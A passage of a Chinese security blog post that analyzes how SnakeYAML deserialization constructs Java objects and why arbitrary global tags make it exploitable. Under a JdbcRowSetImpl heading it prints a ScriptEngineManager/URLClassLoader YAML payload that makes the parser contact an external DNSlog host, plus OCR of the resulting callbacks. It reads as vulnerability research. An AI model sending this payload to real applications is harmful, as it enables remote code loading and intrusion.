+<!-- 这是一张图片，ocr 内容为：M VALUE:CHANGE" EXCEPTION OBJECT: PERSON0825 PUBLIG VOID SET(OBJECT OBJECT, OBJECT VALUE) OMANG.CHANGE 南州幻化的BUS IF (!THIS.WRITABLE) ( WRITABLE: TRUE ON CLASS: " + OBJECT.GETCLASS().QETNAME() HIS.GETNAME() THROW NEW YAMLEXCEPTION( NO WRITABLE PROPERTY OLSO1 RESOURCES VALUE:'CHANGE" INVOKE(OBJECT,VALUE); GETWRITENETHOD THIS.PROPERTY PROPERTY:PROPEL OBJECT:PERSON0825 ? TESTYAML LARGEL 调试 MAIN 线理和变量 控制合 G MAIN'@1在组MAIN"工在运行 对衣达式求值(ENTEN)或添加监视(CTRL+SHIFT+ENTER) G THIS (METHODPROPERTY@838) .- TOSTRING0 SETNAME:38,PERSON (ORG.CHANGRE) INVOKE0:-1,NATIVEMETHODACCESSORLMPL (SUITREFLECT) OBJECT (PERSON@825)... TO5TRING0 INVOKE62,NATIVEMETHODACCESSORLMPL(SUN.REFLECT) @ WALUE ' CHANGE' INVNKE43,DELEGATINGMETHODACCESSORLMPL(SUN.REFLECT) QO THIS WRITABLE - TRUE OO THIS.PROPERTY , (PROPERTYDESCRIPTOR@839) ... TOSTRING0 INWNKE498,METHAD (IEVA.(ANG.REFLECT) SET:77METHODPROPERTY(ORG.YAML.SNAKEYAMLINTROSPECTOR) CONSTRUCUAVABEANZNDSTEP263,CONSTRUCTORSCONSTRUCTMAPPING (ORGYAMISNAKEYAMLCONSTRUCTOR) CONSTRUCT149.CONSTRUCTOR$CONSTRUCTMAPPING (ORG YAML SNAKEYAML.CONSTRUCTOR) CONSTRUCT309.CONSTRUCTOR$CONSTRUCTYARNLOBJECT (ORG,YARNLSNAKEYAMLCONSTRUCTOR) CUNSTRUCTOBJECTNOCHECK216. BASE(ORISTRUCTOR (ORG YARRILSTRAKCYAMLCUNSTRUCTOR) CUNSTRUCTOBJECT:20S, DASECONSTRUCTOR FORG.YAMISNAKEYAINL CONSIRUCTOR! CONSTRUCTDOCURNENT:164,BASECONSTRUCTOR (ORG,YEVNLSNAKEYARNL.CONSTRUCTOR? GETSINGLEDATA:148,BASECONSTRUCTOR (ORGYAINLSNAKEYAML.CONSTRUCTOR) A LOADFROMREADER525,YAML(ORG.YAML SNAKEYAM() 办 INAD:453,YAML(ONG.YAML.SNAKEYAML) MAIN(6,MAIN(ONG.CHANGE) -->
+<p><img src="/images/2025/1754560032843-fd3ad5b6-efc0-40b9-918a-39b0d4d6f1ec.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为：控制台 线码和变量 对表达式求值(ENTER)或添加监视(CTRL+SHIFT+ENTER) "MAIN"@1在组"MAIN":正在运行 THIS-{METHOD@830]... TOSTRING0 SETNAME38,PERSON (ORG.CHANGE) CLAZZ-{CLASS@728)... 导航 INVOKE0:-1,NATIVEMETHODACCESSORLMPL(SUN.REFFECT) INVOKE:62,NATIVEMETHODACCESSORLMPL (SUN.REFFECT) SLOT-4 INVOKE:43,DELEGATINGMETHODACCESSORLMPL(SUN.REFFECT) NAME - 'SETNAME" RETUMTYPE (CLASS@833).... 导航 INVOKE:498.METHOD (JAVA.LANG.REFLECT) SET:77,METHODPROPERTY(ORG.YAML.SNAKEYAMLINTROSPECTOR) PARAMETERTYPES-(CLASS(1]@834) CONSTRUCUAVABEANZNDSTEP:263, CONSTRUCTORSCONSTRUCTMAPPING (ORQYAMLSNAKEYAML.CONSTRUCTOR) EXCEPTIONTYPES-[CLASS[0]@835] CONSTRUCT:149, CONSTRUCTOR$CONSTRUCTMAPPING (ORG.YAML SNAKEYAML.CONSTRUCTOR) MODIFIERS-1 SIGNATURE NULL CONSTRUCT309,CONSTRUCTORSCONSTRUCTYAMLOBJECT (ORG.YAML.SNAKEYAML.CONSTRUCTOR) CONSTRUCTOBJECTNACHECK:216, BASECONSTRUCTOR (ORG.YAML.SNAKEYAML.CONSTRUCTOR) GENERICLNFO-NULL ANNOTATIONS NULL CONSTRUCTOBJECT:205, BASECONSTRUCTOR (ORG.YAML.SNAKEYAML.CONSTRUCTOR) PARAMETERANNOTATIONS-NULL CONSTRUCTDOCUMENT:164, BASECONSTRUCTOR (ORGYAMLSNAKEYAML.CONSTRUCTOR) GETSINGLEDATA:148,BASECONSTRUCTOR (ORG.YAML.SNAKEYAMI.CONSTRUCTOR) ANNOTATIONBEFAULT NULL LOADFROMREADER:525,YAML(ORG.YAML.SNAKEYAML) METHODACCESSOR - (DELEGATINGMETHODACCESSORLMPL@831) 农 LOAD:453,YAML(ORG.YAML.SNAKEYAML) ROOT(METHOD@836)... TOSTRING0) MAIN:16,MAIN(ORG.CHANGE) HASREALPARAMETERDATA FALSE PARAMETERS NULL DECLAREDANNOTATIONS - (COLLECTIONS$EMPTYMAP@837) ..... TOSTRING0. O OVERRIDEFALSE 09 SEGURITVCHECKCACHE : NULL -->
+<p><img src="/images/2025/1754560024504-a3da45b5-7a19-4b39-913a-2a3407085a5b.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="反序列化原理"><a href="#反序列化原理" class="headerlink" title="反序列化原理"></a>反序列化原理</h3><p>我们先从原理来看yaml反序列化是如何实现的，断点打在load处</p>
+<!-- 这是一张图片，ocr 内容为：PUBLIC CLASS MAIN { 10 PUBLIC STATIC VOID MAIN(STRING[] ARGS) { ARGS: [] 11 12 NAME:"TEST.YAML"); INPUTS INPUTSTREAM INPUTSTREAM - MAIN.CLASS.GETCLASSLOADER(),GETRESOURCEASSTREAM( NAME: "T 13 14 15 YAML YAMLNEW YAMLO; YAML:YAML@665 16 17  INPUTSTREAM: BUFFEREDINPUTSTREAM@664  OBJECT RET 三YAML.LOAD(INPUTSTREAM) YAML@665 YAML SYSTEM.OUT.PRINTIN(RET); 19 21 22 -->
+<p><img src="/images/2025/1754640712387-60be92b4-8e6a-46d8-8982-60a8bfe998ee.png" srcset="/img/loading.gif" lazyload></p>
+<p>跟进后会指向loadFromReader这个方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">loadFromReader</span><span class="hljs-params">(StreamReader sreader, Class&lt;?&gt; type)</span> &#123;<br>    <span class="hljs-type">Composer</span> <span class="hljs-variable">composer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Composer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ParserImpl</span>(sreader), <span class="hljs-built_in">this</span>.resolver);<br>    <span class="hljs-built_in">this</span>.constructor.setComposer(composer);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.constructor.getSingleData(type);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这个方法很重要，我们一步步理解</p>
+<ol>
+<li>首先，因为我们传入的是<strong>字符流</strong>StreamReader，因此需要ParserImpl这个类将字符流转为<strong>事件流。</strong></li>
+<li>然后Composer将组装转为<strong>节点树</strong>。</li>
+<li>再将节点树传入<strong>构造器</strong>constructor。</li>
+<li>最后再通过构造器调用getSingleData方法<strong>还原</strong>java对象。</li>
+</ol>
+<p>我们跟进getSingleData，这里简要概况一下各条语句的作用</p>
+<ol>
+<li><code>Node node = this.composer.getSingleNode();</code>获取文件的根节点，确保只有一个根节点</li>
+<li><code>if (node != null &amp;&amp; !Tag.NULL.equals(node.getTag()))</code> 只要节点存在且不是显式 null 就继续；否则走 else，直接返回 Java <code>null</code></li>
+<li><code>if (Object.class != type)</code>和<code>else if (this.rootTag != null)</code>判断是否要覆盖yaml文件中的tag，例如： 我们在实例化yaml对象时指定根类型构造器，那么type就会为根类型构造器指定的类，这个node里面的tag就会被覆盖掉</li>
+<li><code>return this.constructDocument(node);</code>将处理后的节点解析为java对象</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getSingleData</span><span class="hljs-params">(Class&lt;?&gt; type)</span> &#123;<br>    <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.composer.getSingleNode();<br>    <span class="hljs-keyword">if</span> (node != <span class="hljs-literal">null</span> &amp;&amp; !Tag.NULL.equals(node.getTag())) &#123;<br>        <span class="hljs-keyword">if</span> (Object.class != type) &#123;<br>            node.setTag(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Tag</span>(type));<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.rootTag != <span class="hljs-literal">null</span>) &#123;<br>            node.setTag(<span class="hljs-built_in">this</span>.rootTag);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.constructDocument(node);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">Construct</span> <span class="hljs-variable">construct</span> <span class="hljs-operator">=</span> (Construct)<span class="hljs-built_in">this</span>.yamlConstructors.get(Tag.NULL);<br>        <span class="hljs-keyword">return</span> construct.construct(node);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>处理好node之后，将node解析会java对象，并清除缓存，这里<code>constructObject</code>这个方法比较关键，他会递归地遍历整个 Node 树，把每个节点转换成对应的 Java 对象，具体体现为寻找tag指定类的构造器循环如下堆栈查找字段并根据字段的修饰词采用不同的方式赋值</p>
+<ul>
+<li>public 属性调用 FieldProperty#set(Object, Object) 反射</li>
+<li>非public 属性调用 MethodProperty#set(Object, Object) 通过 setter 方法赋值</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">construct:<span class="hljs-number">488</span>, SafeConstructor$ConstructYamlStr (org.yaml.snakeyaml.constructor)<br>constructScalar:<span class="hljs-number">253</span>, BaseConstructor (org.yaml.snakeyaml.constructor)<br>getValue:<span class="hljs-number">105</span>, ScalarNode (org.yaml.snakeyaml.nodes)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Object <span class="hljs-title function_">constructDocument</span><span class="hljs-params">(Node node)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.constructObject(node);<br>        <span class="hljs-built_in">this</span>.fillRecursive();<br>        <span class="hljs-built_in">this</span>.constructedObjects.clear();<br>        <span class="hljs-built_in">this</span>.recursiveObjects.clear();<br>        <span class="hljs-keyword">return</span> data;<br>    &#125; <span class="hljs-keyword">catch</span> (RuntimeException var3) &#123;<br>        <span class="hljs-type">RuntimeException</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> var3;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.wrappedToRootException &amp;&amp; !(e <span class="hljs-keyword">instanceof</span> YAMLException)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">YAMLException</span>(e);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> e;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为：NODE) F PROTECTED OBJECT CONSTRUCTOBJECT(NODE THIS.CONSTRUCTOBJECTNOCHECK(NODE); IRETURN THIS.CONSTRUCTEDOBJECTS.CONTAINSKEY(NODE) ? THIS.CONSTRUCTEDOBJECTS.GET(NODE 142 143 144 PROTECTED OBJECT CONSTRUCTOBJECTNOCHECK(NODE NODE) { NODE: MAPPINGNODE@748 145 IF (THIS.RECURSIVEOBJECTS.CONTAINS(NODE)) { 146 147 LELSE 148  RECURSIVEOBJECTS: HASHSET@692 NODE:MAPPINGNODE@748 THIS.RECURSIVEOBJECTS.ADD(NODE); CONSTRUCT CONSTRUCTOR ; THIS.GETCONSTRUCTOR(NODE) - 150 OBJECT DATA - THIS.CONSTRUCTEDOBJECTS.CONTAINSKEY(NODE) ? THIS.CONSTRUCTEDOBJECTS.GET(NODE) 151 CONSTRUCTOR.CONSTRUCT(NODE) THIS.FINALIZECONSTRUCTION(NODE, DATA); 152 153 THIS.CONSTRUCTEDOBJECTS.PUT(NODE, DATA); THIS.RECURSIVEOBJECTS.REMOVE(NODE); 154 IF (NODE.ISTWOSTEPSCONSTRUCTION() { 155 CONSTRUCTOR.CONSTRUCT2NDSTEP(NODE, DATA); 156 157 158 RETURN  DATA 159 160 161 -->
+<p><img src="/images/2025/1754644639446-5eb8c2f8-6583-4f13-b5a6-00af33bea91c.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>清楚原理之后，漏洞成因就很好理解了，因为YAML反序列化可以通过指定全局tag反序列化任意类，这就留给有心之士许多操作空间。下面来复现一下目前存在的几条链条</p>
+<h4 id="JdbcRowSetImpl链"><a href="#JdbcRowSetImpl链" class="headerlink" title="JdbcRowSetImpl链"></a><font style="color:rgb(51, 51, 51);">JdbcRowSetImpl链</font></h4><p>这条链其实在fastjson那就见过了，其实就是利用AutoCommit的setter调用connect方法，触发lookup，并且DataSourceName可控，从而导致的漏洞。</p>
+<p>至于为什么会触发AutoCommit的setter的方法可以看上面的<strong>反序列化原理</strong></p>
+<!-- 这是一张图片，ocr 内容为：PUBLIC VOID SETAUTOCOMMIT(BOOLEAN VAR1) THROWS SQLEXCEPTION IF (THIS.CONN NULL) THIS.CONN.SETAUTOCOMMIT(VAR1); ELSE  THIS.CONN : THIS.CONNECT(); THIS.CONN.SETAUTOCOMMIT(VAR1); -->
+<p><img src="/images/2025/1754646679520-85d09105-84f9-4aac-a979-103ef672f010.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为：THROWS SQLEXCEPTION ON CONNECT() PRIVATE CONNECTION  IF (THIS.CONN ! NULL) RETURN THIS.CONN; ELSE IF (THIS.GETDATASOURCENAME( (LLNU 三I TRY { INITIALCONTEXT VAR1 - NEW INITIALCONTEXT(); DATASOURCE VAR2 (DATASOURCE) VA ) VAR1.LOOKUP(THIS.GETDATASOURCENAME(); S& !THIS.GETUSERNAME().EQUALS(UU) ? VAR2.GETCONNECTION(THIS.GETUSERNAME() THIS.GETPASSW RETURN THIS.GETUSERNAME()  CATCH (NAMINGEXCEPTION VAR3) { THROW NEW SQLEXCEPTION(THIS.RESBUNDLE.HANDLESETOBJECT( S "IDBCROWSETIMPL.CONNECT"),TOSTRINGO); ELSE{ ; TLU : ( ) -->
+<p><img src="/images/2025/1754646702046-7f29e1f3-2935-4530-8a0f-be12cf9ddc28.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-type">!!javax.script.ScriptEngineManager</span> [<br>    <span class="hljs-type">!!java.net.URLClassLoader</span> [<br>         [<br>             <span class="hljs-type">!!java.net.URL</span> [<span class="hljs-string">&quot;http://1961ea1c.log.goodknow.pp.ua.&quot;</span>]<br>         ]<br>    ]<br>]<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为：DOMAIN DOMAINS LOG.GOODKNOW.PP.UA. SUBDOMAIN:1961EALC.LOG.GOODKNOW.PP.UA. TOKEN:HSGDS8WGJD54 GET SUB DOMAIN GET RESULTS (CLICK TO COPY) RESULTS TIME HOST RECORD 2025-08-08 15:51:44 172.70.205.26:41406 1961EALC.LOG-GOODKNOW.WPP.UA. 172.70.205.140:19334 2025-08-08 15:51:43 1961EALC.LOG.GOODKNOW.UA, 2025-08-08 15:51:43 172.70.205.195:56711 1961EAIC.LOG.GOODKNOW.PP.UA. 1961EALC.LOG-GOODKNOW.PP.UA, 2025-08-08 15:51:43 111.206.4.140:57385 1961EALC.LOG.GOODKNOW.PP.UA. 111.206.4.199:12261 2025-08-08 15:51:42 DNSLOG.ORG XSSTEST.COM AD:虚拟信用上 -->
+<p><img src="/images/2025/1754647133028-3d07dfba-4e3d-41ed-a094-687153611db5.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="ScriptEngineManagerl链"><a href="#ScriptEngineManagerl链" class="headerlink" title="ScriptEngineManagerl链"></a>ScriptEngineManager<font style="color:rgb(51, 51, 51);">l链</font></h4><p>学习这条链之前我们要了解两个前置知识</p>
+<ul>
+<li>Yaml反序列化是支持有参构造的</li>
+<li>SPI机制</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/java%E5%AE%89%E5%85%A8/" class="category-chain-item">java安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" class="print-no-link">#安全研究</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>yaml反序列化分析</div>
+      <div>http://example.com/2025/03/07/yaml反序列化/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月7日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/08/07/%E5%86%85%E5%AD%98%E9%A9%AC/" title="内存马分析">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">内存马分析</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/01/07/JNDI/" title="JNDI注入分析">
+                        <span class="hidden-mobile">JNDI注入分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
